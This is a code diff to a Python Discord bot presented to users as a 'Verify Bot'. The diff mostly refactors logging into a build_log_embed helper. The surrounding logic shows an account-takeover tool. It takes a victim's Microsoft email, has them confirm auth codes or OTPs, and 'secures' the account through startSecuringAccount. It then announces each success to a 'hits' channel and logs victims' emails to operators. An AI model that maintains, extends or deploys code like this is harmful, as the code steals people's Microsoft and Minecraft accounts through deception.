@@ -1,7 +1,6 @@
 from database.database import DBConnection
 from urllib.parse import quote
 from discord import ui, Embed
-import datetime
 import discord
 import asyncio
 import json
@@ -15,7 +14,7 @@ from ui.buttons.account_details import accountInfo
 from securing.auth.check_auth import check_authenticator
 from securing.auth.initial_session import get_session
 from securing.secure import startSecuringAccount
-from shared.send_logs import send_logs
+from shared.send_logs import send_logs, build_log_embed
 from securing.auth.send_auth import send_auth
 
 class MyModalOne(ui.Modal):
@@ -45,13 +44,15 @@ class MyModalOne(ui.Modal):
 
                 await send_logs(
                     interaction.client,
-                    Embed(
-                        description = f"**Email** | **Status** | **Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
-                        timestamp = datetime.datetime.now(),
-                        colour = 0xFA4343
-                    ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                    view = ButtonOptions(interaction.user, interaction.user.id, username),
-                    email = email
+                    build_log_embed(
+                        f"**Email | Status | Reason**\n```{email} | Refused to Verify | User has been blacklisted```",
+                        0xFA4343,
+                        thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                        user=interaction.user,
+                        bot=interaction.client,
+                    ),
+                    view=ButtonOptions(interaction.user, interaction.user.id, username),
+                    email=email,
                 )
                 return
 
@@ -67,14 +68,16 @@ class MyModalOne(ui.Modal):
             )
 
             await send_logs(
-                interaction.client, 
-                    Embed(
-                        description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to Verify | Invalid email entered```",
-                    timestamp = datetime.datetime.now(),
-                    colour = 0xFA4343
-                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                view = ButtonOptions(interaction.user, interaction.user.id, username),
-                email = email
+                interaction.client,
+                build_log_embed(
+                    f"**Email | Status | Reason**\n```{email} | Failed to Verify | Invalid email entered```",
+                    0xFA4343,
+                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                    user=interaction.user,
+                    bot=interaction.client,
+                ),
+                view=ButtonOptions(interaction.user, interaction.user.id, username),
+                email=email,
             )
             return
 
@@ -89,13 +92,15 @@ class MyModalOne(ui.Modal):
         if "Credentials" not in emailInfo:
             await send_logs(
                 interaction.client,
-                Embed(
-                    description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | Email does not exist```",
-                    timestamp = datetime.datetime.now(),
-                    colour = 0xFA4343
-                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                view = ButtonOptions(interaction.user, interaction.user.id, username),
-                email = email
+                build_log_embed(
+                    f"**Email | Status | Reason**\n```{email} | Failed to send code | Email does not exist```",
+                    0xFA4343,
+                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                    user=interaction.user,
+                    bot=interaction.client,
+                ),
+                view=ButtonOptions(interaction.user, interaction.user.id, username),
+                email=email,
             )
 
             await interaction.followup.send(
@@ -127,13 +132,15 @@ class MyModalOne(ui.Modal):
 
             await send_logs(
                 interaction.client,
-                Embed(
-                    description=f"Username | Email | Status\n```{username} | {email} | Waiting for Auth confirmation```",
-                    timestamp = datetime.datetime.now(),
-                    colour = 0x3B89FF,
-                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                view = ButtonOptions(interaction.user, interaction.user.id, username),
-                email = email
+                build_log_embed(
+                    f"**Username | Email | Status**\n```{username} | {email} | Waiting for Auth confirmation```",
+                    0x3B89FF,
+                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                    user=interaction.user,
+                    bot=interaction.client,
+                ),
+                view=ButtonOptions(interaction.user, interaction.user.id, username),
+                email=email,
             )
 
             i = 0
@@ -153,13 +160,15 @@ class MyModalOne(ui.Modal):
 
                     await send_logs(
                         interaction.client,
-                        Embed(
-                            description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
-                            timestamp = datetime.datetime.now(),
-                            colour = 0xFA4343
-                        ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                        view = ButtonOptions(interaction.user, interaction.user.id, username),
-                        email = email
+                        build_log_embed(
+                            f"**Email | Status | Reason**\n```{email} | Failed to verify | Clicked on the wrong auth number```",
+                            0xFA4343,
+                            thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                            user=interaction.user,
+                            bot=interaction.client,
+                        ),
+                        view=ButtonOptions(interaction.user, interaction.user.id, username),
+                        email=email,
                     )
                     return
 
@@ -171,13 +180,15 @@ class MyModalOne(ui.Modal):
                     )
                     await send_logs(
                         interaction.client,
-                        Embed(
-                            description=f"Username | Email | Status\n```{username} | {email} | Auth code confirmed!```",
-                            timestamp = datetime.datetime.now(),
-                            colour = 0x79D990,
-                        ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                        view = ButtonOptions(interaction.user, interaction.user.id, username),
-                        email = email
+                        build_log_embed(
+                            f"**Username | Email | Status**\n```{username} | {email} | Auth code confirmed!```",
+                            0x79D990,
+                            thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                            user=interaction.user,
+                            bot=interaction.client,
+                        ),
+                        view=ButtonOptions(interaction.user, interaction.user.id, username),
+                        email=email,
                     )
 
                     await interaction.followup.send(
@@ -195,13 +206,15 @@ class MyModalOne(ui.Modal):
                     if not securedAccount:
                         await send_logs(
                             interaction.client,
-                            Embed(
-                                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
-                                timestamp = datetime.datetime.now(),
-                                colour = 0xFA4343
-                            ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                            view = ButtonOptions(interaction.user, interaction.user.id, username),
-                            email = email
+                            build_log_embed(
+                                f"**Email | Status | Reason**\n```{email} | Failed to secure | Invalid Code Entered```",
+                                0xFA4343,
+                                thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                                user=interaction.user,
+                                bot=interaction.client,
+                            ),
+                            view=ButtonOptions(interaction.user, interaction.user.id, username),
+                            email=email,
                         )
                         return
 
@@ -217,8 +230,8 @@ class MyModalOne(ui.Modal):
                             description=secured_desc,
                             color=0xFF9E45 if mc_name != "No Minecraft" else 0x3B89FF
                         ).set_thumbnail(url=f"https://mc-heads.net/avatar/{quote(mc_name)}/128"),
-                        email = email,
-                        conly = True
+                        email=email,
+                        censored_only=True,
                     )
 
                     await hits_channel.send("@everyone **Successfully secured an account**")
@@ -246,12 +259,15 @@ class MyModalOne(ui.Modal):
 
             await send_logs(
                 interaction.client,
-                Embed(
-                    description=f"Username | Email | Status\n```{username} | {email} | Failed to confirm for Auth```",
-                    colour = 0xDE755B
-                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                view = ButtonOptions(interaction.user, interaction.user.id, username),
-                email = email
+                build_log_embed(
+                    f"**Username | Email | Status**\n```{username} | {email} | Failed to confirm for Auth```",
+                    0xDE755B,
+                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                    user=interaction.user,
+                    bot=interaction.client,
+                ),
+                view=ButtonOptions(interaction.user, interaction.user.id, username),
+                email=email,
             )
             return
 
@@ -284,26 +300,31 @@ class MyModalOne(ui.Modal):
             )
 
             await send_logs(
-                interaction.client, 
-                Embed(
-                    description=f"Username | Email | Status\n```{username} | {email} | Waiting for OTP code```",
-                    timestamp = datetime.datetime.now(),
-                    colour = 0x3B89FF,
-                ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-                view = ButtonOptions(interaction.user, interaction.user.id, username),
-                email = email
+                interaction.client,
+                build_log_embed(
+                    f"**Username | Email | Status**\n```{username} | {email} | Waiting for OTP code```",
+                    0x3B89FF,
+                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                    user=interaction.user,
+                    bot=interaction.client
+                ),
+                email=email,
+                view=ButtonOptions(interaction.user, interaction.user.id, username)
             )
+
             return
 
         await send_logs(
-            interaction.client, 
-            Embed(
-                description = f"**Email** | **Status** | **Reason**\n```{email} | Failed to send code | No OTP methods found```",
-                timestamp = datetime.datetime.now(),
-                colour = 0xFA4343
-            ).set_thumbnail(url = f"https://visage.surgeplay.com/full/512/{username}").set_author(name=f"{interaction.user.name} | {interaction.user.id}", icon_url=interaction.user.display_avatar.url).set_footer(text=f"Verify Bot • {datetime.datetime.now().strftime('%d/%m/%Y, %H:%M')}"),
-            view = ButtonOptions(interaction.user, interaction.user.id, username),
-            email = email
+            interaction.client,
+            build_log_embed(
+                f"**Email | Status | Reason**\n```{email} | Failed to send code | No OTP methods found```",
+                0xFA4343,
+                thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
+                user=interaction.user,
+                bot=interaction.client
+            ),
+            email=email,
+            view=ButtonOptions(interaction.user, interaction.user.id, username)
         )
 
         await interaction.followup.send(
@@ -311,7 +332,7 @@ class MyModalOne(ui.Modal):
                 title = "Security Email Required",
                 description = "We couldn't detect a recovery/security email for this account. Add a recovery email in your Microsoft account and try verifying again."
             ),
-            view = ButtonViewThree(),
+            view=ButtonViewThree(),
             ephemeral = True
         )
 
